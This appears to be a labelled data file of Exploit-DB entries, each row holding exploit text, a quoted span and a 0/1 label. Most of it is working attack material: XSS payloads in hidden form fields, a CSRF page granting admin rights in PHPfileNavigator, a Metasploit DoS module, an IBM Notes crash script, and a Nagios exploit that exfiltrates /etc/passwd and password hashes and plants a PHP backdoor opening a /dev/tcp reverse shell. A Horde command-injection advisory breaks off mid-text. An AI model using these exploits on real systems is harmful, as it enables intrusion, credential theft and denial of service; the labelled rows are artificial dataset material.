<input type=""hidden"" name=""styles&#91;502&#93;"" value=""left"" />       <input type=""hidden"" name=""styles&#91;193&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;194&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;195&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;196&#93;"" value=""solid"" />       <input type=""hidden"" name=""styles&#91;197&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;198&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;199&#93;"" value=""normal"" />       <input type=""hidden"" name=""styles&#91;200&#93;"" value=""normal"" />       <input type=""hidden"" name=""styles&#91;201&#93;"" value=""none"" />       <input type=""hidden"" name=""styles&#91;202&#93;"" value=""inherit"" />       <input type=""hidden"" name=""styles&#91;511&#93;"" value=""cfg&#95;font&#95;effect&#95;none"" />       <input type=""hidden"" name=""styles&#91;203&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;204&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;205&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;206&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;215&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;216&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;217&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;218&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;31&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;32&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;33&#93;"" value=""normal"" />       <input type=""hidden"" name=""styles&#91;34&#93;"" value=""normal"" />       <input type=""hidden"" name=""styles&#91;35&#93;"" value=""none"" />       <input type=""hidden"" name=""styles&#91;36&#93;"" value=""left"" />       <input type=""hidden"" name=""styles&#91;507&#93;"" value=""inherit"" />       <input type=""hidden"" name=""styles&#91;512&#93;"" value=""cfg&#95;font&#95;effect&#95;none"" />       <input type=""hidden"" name=""styles&#91;37&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;38&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;39&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;40&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;41&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;42&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;43&#93;"" value=""normal"" />       <input type=""hidden"" name=""styles&#91;44&#93;"" value=""normal"" />       <input type=""hidden"" name=""styles&#91;509&#93;"" value=""inherit"" />       <input type=""hidden"" name=""styles&#91;46&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;47&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;48&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;49&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;505&#93;"" value=""white"" />       <input type=""hidden"" name=""styles&#91;508&#93;"" value=""inherit"" />       <input type=""hidden"" name=""styles&#91;132&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;133&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;168&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;519&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;520&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;500&#93;"" value=""left"" />       <input type=""hidden"" name=""styles&#91;501&#93;"" value=""left"" />       <input type=""hidden"" name=""styles&#91;134&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;135&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;136&#93;"" value=""solid"" />       <input type=""hidden"" name=""styles&#91;137&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;138&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;139&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;140&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;141&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;142&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;143&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;144&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;145&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;146&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;147&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;148&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;149&#93;"" value=""normal"" />       <input type=""hidden"" name=""styles&#91;150&#93;"" value=""normal"" />       <input type=""hidden"" name=""styles&#91;151&#93;"" value=""none"" />       <input type=""hidden"" name=""styles&#91;152&#93;"" value=""inherit"" />       <input type=""hidden"" name=""styles&#91;153&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;154&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;155&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;156&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;157&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;158&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;159&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;160&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;161&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;162&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;163&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;164&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;165&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;166&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;167&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;513&#93;"" value=""cfg&#95;font&#95;effect&#95;none"" />       <input type=""hidden"" name=""styles&#91;176&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;177&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;178&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;179&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;180&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;181&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;182&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;183&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;184&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;185&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;186&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;187&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;188&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;189&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;171&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;514&#93;"" value=""cfg&#95;font&#95;effect&#95;none"" />       <input type=""hidden"" name=""styles&#91;172&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;173&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;174&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;175&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;169&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;521&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;522&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;170&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;523&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;x&gt;"" />       <input type=""hidden"" name=""styles&#91;535&#93;"" value=""&quot;&gt;&lt;img&#32;src&#61;",,
,sending a special link to a wordpress administrator having installed the vulnerable plugin,1,
37819,"PHPfileNavigator 2.3.3 - Privilege Escalation [+] Credits: John Page aka hyp3rlinx  [+] Website: hyp3rlinx.altervista.org  [+] Source: http://hyp3rlinx.altervista.org/advisories/AS-PHPFILENAVIGATOR0812b.txt    Vendor: ========================= pfn.sourceforge.net    Product: ===================================================== PHPfileNavigator v2.3.3 (pfn)  Is state-of-the-art, open source web based application to complete manage your files and folders.    Vulnerability Type: ============================= Privilege Escalation    CVE Reference: ============== N/A     Vulnerability Details: ===================== We can elevate privileges from that of a regular user to an Admin level. In order for the attack to succeed and escalate privileges to become Admin you need know your ID  for the 'id_usuario' field when executing the attack.  Tested using xampp-1.7.0   Exploit code(s): ===============  <!DOCTYPE> <html> <script> function pwn(){ var e=document.getElementById('ELEVATO_DE_PRIVLOS') e.submit()  } </script> <body onLoad=""pwn()"">   <!-- Escalate privs to that of Admin -->      <form id=""ELEVATO_DE_PRIVLOS"" action="" http://localhost/PHPfileNavigator/pfn-2.3.3/xestion/usuarios/gdar.php"" method=""post"">     <input type=""hidden"" name=""id_usuario"" value=""5"" />     <input type=""text"" id=""nome"" name=""nome"" value=""b2"" class=""text"" tabindex=""10"" />     <input type=""text"" id=""usuario"" name=""usuario"" value=""b2"" class=""text"" tabindex=""20"" />     <input type=""password"" id=""contrasinal"" name=""contrasinal"" value=""abc123"" class=""text"" tabindex=""30"" />     <input type=""password"" id=""rep_contrasinal"" name=""rep_contrasinal"" value=""abc123"" class=""text"" tabindex=""40"" />     <input type=""text"" id=""email"" name=""email"" value=""b@b.com"" class=""text"" tabindex=""50"" />     <input type=""text"" id=""max_descargas"" name=""max_descargas"" value=""0"" class=""text"" tabindex=""60"" />     <input type=""text"" id=""actual_descargas"" name=""actual_descargas"" value=""0"" class=""text"" tabindex=""70"" />     <select id=""cambiar_datos"" name=""cambiar_datos"" tabindex=""75"">     <option value=""1"" >ON</option>     <option value=""0"" selected=""selected"">OFF</option>     </select>     <select id=""id_grupo"" name=""id_grupo"" tabindex=""80"">     <option value=""1"" selected=""selected"">Administrators</option>     </select>     <select id=""admin"" name=""admin"" tabindex=""90"">     <option value=""1"" selected=""selected"">ON</option>     <option value=""0"">OFF</option>     </select>     <select id=""estado"" name=""estado"" tabindex=""100"">     <option value=""1"" selected=""selected"">ON</option>     <option value=""0"" >OFF</option>     </select>     <input type=""checkbox"" id=""Fraices_1"" name=""Fraices[]"" value=""1""  class=""checkbox"" />     </form>  </body> </html>     Disclosure Timeline: ========================================================= Vendor Notification: August 8, 2015 August 12, 2015 : Public Disclosure    Severity Level: ========================================================= High    Description: ==========================================================   Request Method(s):              [+] POST   Vulnerable Product:             [+] PHPfileNavigator v2.3.3 (pfn)   Vulnerable Parameter(s):        [+] id_grupo, admin, id_usuario   Affected Area(s):               [+] Admin   ===========================================================  [+] Disclaimer Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.  by hyp3rlinx",our malicious linx,0
4033,"SNMPc 7.0.18 - Remote Denial of Service (Metasploit) ## # $Id: snmpc.rb  2007-06-03  $ ##  ## # This file is part of the Metasploit Framework and may be subject to  # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/projects/Framework/ ##   require 'msf/core'  module Msf  class Auxiliary::Dos::Windows::Snmpc < Msf::Auxiliary  	include Exploit::Remote::Tcp  	def initialize(info = {}) 		super(update_info(info,	 			'Name'           => 'SNMPc ', 			'Description'    => %q{ 				This module sends a specially-crafted packet to the service login of snmpc  				causing a denial of service of snmpc. 			}, 			'Author'         => [ 'En Douli, Tks to OaiTeam <DouliEn@gmail.com>' ], 			'License'        => MSF_LICENSE, 			'Version'        => '$Revision: 1 $', 			'References'     => 				[ 					[ 'CVE', 'XXXXXXX' ], 				])) 			 			register_options([Opt::RPORT(165),], self.class) 	end  	def run 		connect 		init = ""\x14\x00\x00\x00\x70\xa9\x00\x00\x51\x03\x00\x00\x02\x00\x00\x00\x72\x63\x6f\x6e"" 		pkt = ""\x29\x00\x00\x00\xbc\xee\x00\x00\x52\x03\x00\x00\x02\x00\x00\x00\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74"" 		pkt << ""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"" * 56 		pkt << ""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x09"" 		pkt << ""\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"" * 35 		pkt <<	 ""\x41\x41\x41\x41\x41\x41\x41\x41\x09\x30\x00"" 		 		print_status(""Sending dos packet ... "") 		 		sock.put(init) 		sock.put(pkt) 		 		disconnect 	end  end end	  # milw0rm.com [2007-06-04]",a specially-crafted packet to the service login of snmpc,1
19877,"FrontPage 98/Personal WebServer 1.0 / Personal Web Server 2.0 - 'htimage.exe' File Existence Disclosure source: https://www.securityfocus.com/bid/1141/info  htimage.exe can be used to determine if a specified path and filename exists on the target host or not. The specified path must be on the same logical drive as the web content.  Any file can be specified as an image map in the URL. htimage.exe will then look for that path in the webroot, and then the root of the logical drive containing the webroot. If htimage.exe finds the file, it will generate an error about the file not being a valid image map, along the lines of:  ""No URL returned, not even default set for the picture."" (for a .txt or .bat file)  or:  ""Syntax error at line 1 Bad field name, expecting 'default', 'rectangle', 'circle' or 'polygon' (got an alphanumeric string).""  Although this in itself is a small issue, it could be used as part of OS fingerprinting or root folder discovery.  Requesting a nonexistent file will return an error message disclosing the actual path of the web root.   Eg.  Error calling HTImage:  Picture config file not found, tried the following: * C:\Inetpub\wwwroot\path\non-existent-file.html * /path/non-existent-file.html  http:&nbsp;//target/cgi-bin/htimage.exe/path/filename?0,0",a specially crafted .bat file,1
42604,"IBM Notes 8.5.x/9.0.x - Denial of Service (2) # Exploit Title: IBM Notes is affected by a denial of service vulnerability # Date: 31 August 2017 # Software Link: http://www-01.ibm.com/support/docview.wss?uid=swg21999384 # Exploit Author: Dhiraj Mishra  # Contact: http://twitter.com/mishradhiraj_ # Website: http://datarift.blogspot.in/ # CVE: CVE-2017-1130 # Category:  IBM Notes (Console Application)     1. Description   IBM Notes is vulnerable to a denial of service involving persuading a user to click on a malicious link, which would ultimately cause the client to have to be restarted.    2. Proof of concept   <script> var w; var wins = {}; var i = 1; f.click(); setInterval(""f.click()"", 1); setInterval(function(){ 	for (var k in wins) { 		// after creating window .status = '' (empty string), when the file dialog is displayed its value changes to 'undefined'. 		if (wins[k] && wins[k].status === undefined) { 			wins[k].close(); 			delete wins[k]; 		} 	} 	w = open('data:text/html,<input type=file id=f><script>f.click();setInterval(""f.click()"", 1);<\/script>'); 	if (w) { 		wins[i] = w; 		i++; 	} }, 1); </script>     3. IBM Security Bulletin   http://www-01.ibm.com/support/docview.wss?uid=swg21999384",click on a malicious link,1
40920,"Nagios < 4.2.2 - Arbitrary Code Execution #!/usr/bin/env python  # Source: https://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html  intro = """"""\033[94m Nagios Core < 4.2.0 Curl Command Injection / Code Execution PoC Exploit CVE-2016-9565 nagios_cmd_injection.py ver. 1.0  Discovered & Coded by:  Dawid Golunski https://legalhackers.com \033[0m """""" usage = """""" This PoC exploit can allow well-positioned attackers to extract and write  arbitrary files on the Nagios server which can lead to arbitrary code execution on Nagios deployments that follow the official Nagios installation guidelines.   For details, see the full advisory at: https://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html  PoC Video: https://legalhackers.com/videos/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html  Follow https://twitter.com/dawid_golunski for updates on this advisory.  Remember you can turn the nagios shell into root shell via CVE-2016-9565: https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html  Usage:  ./nagios_cmd_injection.py reverse_shell_ip [reverse_shell_port]  Disclaimer: For testing purposes only. Do no harm.  """"""  import os import sys import time import re import tornado.httpserver import tornado.web import tornado.ioloop  exploited  = 0  docroot_rw = 0  class MainHandler(tornado.web.RequestHandler):      def get(self): 	global exploited 	if (exploited == 1): 		self.finish() 	else: 		ua  = self.request.headers['User-Agent'] 		if ""Magpie"" in ua: 			print ""[+] Received GET request from Nagios server (%s) ! Sending redirect to inject our curl payload:\n"" % self.request.remote_ip 			print  '-Fpasswd=@/etc/passwd -Fgroup=@/etc/group -Fhtauth=@/usr/local/nagios/etc/htpasswd.users --trace-ascii ' + backdoor_path + '\n' 			self.redirect('https://' + self.request.host + '/nagioshack -Fpasswd=@/etc/passwd -Fgroup=@/etc/group -Fhtauth=@/usr/local/nagios/etc/htpasswd.users --trace-ascii ' + backdoor_path, permanent=False) 			exploited = 1      def post(self):                 global docroot_rw 	print ""[+] Success, curl payload injected! Received data back from the Nagios server %s\n"" % self.request.remote_ip  	# Extract /etc/passwd from the target          passwd = self.request.files['passwd'][0]['body'] 	print ""[*] Contents of /etc/passwd file from the target:\n\n%s"" % passwd  	# Extract /usr/local/nagios/etc/htpasswd.users         htauth = self.request.files['htauth'][0]['body'] 	print ""[*] Contents of /usr/local/nagios/etc/htpasswd.users file:\n\n%s"" % htauth  	# Extract nagios group from /etc/group         group = self.request.files['group'][0]['body'] 	for line in group.splitlines(): 	    if ""nagios:"" in line: 		nagios_group = line 		print ""[*] Retrieved nagios group line from /etc/group file on the target: %s\n"" % nagios_group 	if ""www-data"" in nagios_group: 		print ""[+] Happy days, 'www-data' user belongs to 'nagios' group! (meaning writable webroot)\n"" 		docroot_rw = 1  	# Put backdoor PHP payload within the 'Server' response header so that it gets properly saved via the curl 'trace-ascii' 	# option. The output trace should contain  an unwrapped line similar to: 	#  	# == Info: Server <?php system(""/bin/bash -c 'nohup bash -i >/dev/tcp/192.168.57.3/8080 0<&1 2>&1 &'""); ?> is not blacklisted 	# 	# which will do the trick as it won't mess up the payload :) 	self.add_header('Server', backdoor)  	# Return XML/feed with JavaScript payload that will run the backdoor code from nagios-backdoor.php via <img src=> tag :) 	print ""[*] Feed XML with JS payload returned to the client in the response. This should load nagios-backdoor.php in no time :) \n"" 	self.write(xmldata)  	self.finish() 	tornado.ioloop.IOLoop.instance().stop()   if __name__ == ""__main__"":     global backdoor_path     global backdoor      print intro      # Set attacker's external IP & port to be used by the reverse shell     if len(sys.argv) < 2 : 	   print usage 	   sys.exit(2)     attacker_ip   = sys.argv[1]     if len(sys.argv) == 3 : 	   attacker_port = sys.argv[1]     else: 	   attacker_port = 8080      # PHP backdoor to be saved on the target Nagios server     backdoor_path = '/usr/local/nagios/share/nagios-backdoor.php'     backdoor = """"""<?php system(""/bin/bash -c 'nohup bash -i >/dev/tcp/%s/%s 0<&1 2>&1 &'""); die(""stop processing""); ?>"""""" % (attacker_ip, attacker_port)      # Feed XML containing JavaScript payload that will load the nagios-backdoor.php script     global xmldata     xmldata = """"""<?xml version=""1.0""?>     <rss version=""2.0"">           <channel>             <title>Nagios feed with injected JS payload</title>             <item>               <title>Item 1</title>               <description>                  <strong>Feed injected. Here we go </strong> -                  loading /nagios/nagios-backdoor.php now via img tag... check your netcat listener for nagios shell ;)                   <img src=""/nagios/nagios-backdoor.php"" onerror=""alert('Reverse Shell /nagios/nagios-backdoor.php executed!')"">                </description>              </item>            </channel>     </rss> """"""       # Generate SSL cert     print ""[+] Generating SSL certificate for our python HTTPS web server \n""     os.system(""echo -e '\n\n\n\n\n\n\n\n\n' | openssl req  -nodes -new -x509  -keyout server.key -out server.cert 2>/dev/null"")      print ""[+] Starting the web server on ports 80 & 443 \n""     application = tornado.web.Application([         (r'/.*', MainHandler)     ])     application.listen(80)     http_server = tornado.httpserver.HTTPServer(         application,          ssl_options = {             ""certfile"": os.path.join(""./"", ""server.cert""),             ""keyfile"": os.path.join(""./"", ""server.key""),         }     )     http_server.listen(443)      print ""[+] Web server ready for connection from Nagios (http://target-svr/nagios/rss-corefeed.php). Time for your dnsspoof magic... ;)\n""     tornado.ioloop.IOLoop.current().start()      if (docroot_rw == 1): 	    print ""[+] PHP backdoor should have been saved in %s on the target by now!\n"" % backdoor_path 	    print ""[*] Spawning netcat and waiting for the nagios shell (remember you can escalate to root via CVE-2016-9566 :)\n"" 	    os.system(""nc -v -l -p 8080"") 	    print ""\n[+] Shell closed\n""      print ""[+] That's all. Exiting\n""",the malicious version,1
41864,"Horde Groupware Webmail 3/4/5 - Multiple Remote Code Executions Source: https://blogs.securiteam.com/index.php/archives/3107  Vulnerabilities Summary The following advisory describes two (2) vulnerabilities found in Horde Groupware Webmail.  Horde Groupware Webmail Edition is a free, enterprise ready, browser based communication suite. Users can read, send and organize email messages and manage and share calendars, contacts, tasks, notes, files, and bookmarks with the standards compliant components from the Horde Project. Horde Groupware Webmail Edition bundles the separately available applications IMP, Ingo, Kronolith, Turba, Nag, Mnemo, Gollem, and Trean.  It can be extended with any of the released Horde applications or the applications that are still in development, like a bookmark manager or a file manager.  Affected versions: Horde 5, 4 and 3  The vulnerabilities found in Horde Groupware Webmail are:  Authentication Remote Code Execution Unauthentication Remote Code Execution  Credit An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.  Vendor response Horde has released a patch to address the vulnerabilities.  For more information: https://lists.horde.org/archives/horde/Week-of-Mon-20170403/056767.html  Vulnerabilities Details  Authentication Remote Code Execution Horde Webmail contains a vulnerability that allows a remote attacker to execute arbitrary code with the privileges of the user who runs the web server.  For successful attack GnuPG feature should be enabled on the target server (path to gpg binary should be defined in $conf[gnupg][path] setting).  Vulnerable code: encryptMessage() function of GPG feature.  Path: /Horde/Crypt/Pgp/Backend/Binary.php:  /* 416 */ public function encryptMessage($text, $params) /* 417 */ { /* … */ /* 435 */ foreach (array_keys($params['recips']) as $val) { /* 436 */ $cmdline[] = '--recipient ' . $val; #! vulnerable code /* … */ /* 444 */ /* Encrypt the document. */ /* 445 */ $result = $this->_callGpg( /* 446 */ $cmdline, /* 447 */ 'w', /* 448 */ empty($params['symmetric']) ? null : $params['passphrase'], /* 449 */ true, /* 450 */ true /* 451 */ );  $params[‘recips’] will be added to $cmdline array and passed to _callGpg():  Path: /Horde/Crypt/Pgp/Backend/Binary.php:  /* 642 */ public function _callGpg( /* 643 */ $options, $mode, $input = array(), $output = false, $stderr = false, /* 644 */ $parseable = false, $verbose = false /* 645 */ ) /* 646 */ { /* … */ /* 675 */ $cmdline = implode(' ', array_merge($this->_gnupg, $options)); /* … */ /* 681 */ if ($mode == 'w') { /* 682 */ if ($fp = popen($cmdline, 'w')) {                        #! vulnerable code /* … */  We can see that our recipients (addresses) will be in command line that is going to be executed. encryptMessage() function can be reached by various API, requests. For example it will be called when user try to send encrypted message.  Our request for encryption and sending our message will be processed by buildAndSendMessage() method: Path: /imp/lib/Compose.php  /* 733 */ public function buildAndSendMessage( /* 734 */ $body, $header, IMP_Prefs_Identity $identity, array $opts = array() /* 735 */ ) /* 736 */ { /* 737 */ global $conf, $injector, $notification, $prefs, $registry, $session; /* 738 */ /* 739 */ /* We need at least one recipient & RFC 2822 requires that no 8-bit /* 740 */ * characters can be in the address fields. */ /* 741 */ $recip = $this->recipientList($header); /* ... */ /* 793 */ /* Must encrypt & send the message one recipient at a time. */ /* 794 */ if ($prefs->getValue('use_smime') && /* 795 */ in_array($encrypt, array(IMP_Crypt_Smime::ENCRYPT, IMP_Crypt_Smime::SIGNENC))) { /* ... */ /* 807 */ } else { /* 808 */ /* Can send in clear-text all at once, or PGP can encrypt /* 809 */ * multiple addresses in the same message. */ /* 810 */ $msg_options['from'] = $from; /* 811 */ $save_msg = $this->_createMimeMessage($recip['list'], $body, $msg_options);        #! vulnerable code  In line 741 it tries to create recipient list: Horde parsers values of ‘to’, ‘cc’, ‘bcc’ headers and creates list of Rfc822 addresses. In general there are restrictions for characters in addresses but if we will use the next format:  display-name <""somemailbox""@somedomain.com>  somemailbox will be parsed by _rfc822ParseQuotedString() method:  Path: /Horde/Mail/Rfc822.php:  /* 557 */ protected function _rfc822ParseQuotedString(&$str) /* 558 */ { /* 559 */ if ($this->_curr(true) != '""') { /* 560 */ throw new Horde_Mail_Exception('Error when parsing a quoted string.'); /* 561 */ } /* 563 */ while (($chr = $this->_curr(true)) !== false) { /* 564 */ switch ($chr) { /* 565 */ case '""': /* 566 */ $this->_rfc822SkipLwsp(); /* 567 */ return; /* 569 */ case ""\n"": /* 570 */ /* Folding whitespace, remove the (CR)LF. */ /* 571 */ if (substr($str, -1) == ""\r"") { /* 572 */ $str = substr($str, 0, -1); /* 573 */ } /* 574 */ continue; /* 576 */ case '\\': /* 577 */ if (($chr = $this->_curr(true)) === false) { /* 578 */ break 2; /* 579 */ } /* 580 */ break; /* 581 */ } /* 583 */ $str .= $chr; /* 584 */ } /* 586 */ /* Missing trailing '""', or partial quoted character. */ /* 587 */ throw new Horde_Mail_Exception('Error when parsing a quoted string.'); /* 588 */ }  There are only a few limitations:  we cannot use “ \n will be deleted we cannot use \ at the end of our mailbox  After creation of recipient list buildAndSendMessage() will call _createMimeMessage():  Path: /imp/lib/Compose.php  /* 1446 */ protected function _createMimeMessage( /* 1447 */ Horde_Mail_Rfc822_List $to, $body, array $options = array() /* 1448 */ ) /* 1449 */ { /* 1450 */ global $conf, $injector, $prefs, $registry; /* ... */ /* 1691 */ /* Set up the base message now. */ /* 1692 */ $encrypt = empty($options['encrypt']) /* 1693 */ ? IMP::ENCRYPT_NONE /* 1694 */ : $options['encrypt']; /* 1695 */ if 